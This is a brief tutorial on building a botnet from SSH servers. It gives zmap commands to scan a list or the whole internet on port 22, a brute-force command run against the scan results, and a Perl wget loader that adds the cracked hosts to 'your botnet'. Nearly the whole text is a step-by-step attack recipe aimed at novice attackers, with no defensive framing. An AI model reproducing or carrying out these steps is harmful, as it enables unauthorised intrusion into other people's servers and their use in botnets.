[SSH Scan Tutorial By Merlyn]

First you want to ZMAP a region or the world.

[List Scanning]
Zmap -p22 -w LIST.lst -o mfu.txt

[World Scanning]
Zmap -p22 -o mfu.txt

Once your scan is complete run your bruter file.
for most skids its ./update, however in mine you'll fine a more advanced one called ./bruter
so now brute your bots.

[Brute Command]
./bruter mfu.txt [port] 1500

now that you have bruted a list of vulns, scan them to your botnet with your perl file.

[Load Command]
perl wget.pl vuln.txt
